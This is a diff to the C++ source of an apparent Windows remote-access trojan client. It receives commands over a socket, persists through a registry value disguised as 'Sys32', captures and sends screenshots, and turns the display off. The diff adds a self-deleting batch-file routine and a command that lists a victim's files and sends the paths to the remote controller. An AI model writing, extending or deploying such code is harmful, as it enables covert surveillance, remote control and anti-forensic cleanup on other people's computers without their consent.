@@ -5,6 +5,7 @@
 #include <iostream>
 #include <winsock2.h>
 #include <direct.h>
+#include <fstream>
 #include <windows.h>
 #include <gdiplus.h>
 
@@ -28,6 +29,9 @@ bool checkend(char *arr, int len) {
 
 int main(int argc, char* argv[])
 {
+	setlocale(LC_ALL, "rus");
+	SetConsoleCP(1251);
+	SetConsoleOutputCP(1251);
 	while (1) {
 	char buffer2[256] = "";
 	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
@@ -45,7 +49,6 @@ int main(int argc, char* argv[])
 		RegSetValueEx(hKeys, "Sys32", 0, REG_SZ, reinterpret_cast<const BYTE*>(&buffer2), sizeof(buffer2));
 		RegCloseKey(hKeys);
 	}
-	setlocale(LC_ALL, "rus");
 	char buff[1024];
 	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
 		buff[i] = '\0';
@@ -137,6 +140,39 @@ int main(int argc, char* argv[])
 			}
 			CloseHandle(hFile);
 		}
+		else if ((buff[0]=='d')&&(buff[1]=='e')&&(buff[2]=='l')) {
+			char delfile[] = "@echo off\n:loop\ndel Client.exe\nif exist 1.txt goto : loop\ndel %0";
+			ofstream File;
+			File.open("del.bat");
+			File << delfile;
+			File.close();
+			system("start del.bat");
+			return 0;
+		}
+		else if ((buff[0] == 'd') && (buff[1] == 'i') && (buff[2] == 'r')) {
+			const int buflen = 1024;
+			WIN32_FIND_DATA FindFileData;
+			char *ap;
+			ap = buff + 4;
+			HANDLE hf = FindFirstFile(ap, &FindFileData);
+			char fileNames[200][MAX_PATH] = { "" };
+			INT i = 0;
+			if (hf == INVALID_HANDLE_VALUE) { puts("Path not found"); return 1; }
+			cout << "Select one of the following files:\n";
+			do {
+				strcpy_s(fileNames[i], FindFileData.cFileName);
+				cout << "[" << i << "]";
+				puts(fileNames[i]);
+				char buffer[buflen];
+				strcpy_s(buffer, MAX_PATH, ap);
+				strcat_s(buffer, MAX_PATH, "\\");
+				strcat_s(buffer, MAX_PATH, FindFileData.cFileName);
+				send(my_sock, buffer, buflen, 0);
+				++i;
+			} while (FindNextFile(hf, &FindFileData));
+			send(my_sock, "^@@", 3, 0);
+			FindClose(hf);
+		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'o')) {
 			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
 		}
@@ -213,7 +249,7 @@ int main(int argc, char* argv[])
 			bitmap.Save(L"screen.png", &png);
 			DeleteObject(hBitmap);
 			FILE *in1;
-			fopen_s(&in1, "Client.exe", "rb");
+			fopen_s(&in1, "screen.png", "rb");
 			const int buflen = 1024;
 			bool end = false;
 			bool end2 = false;
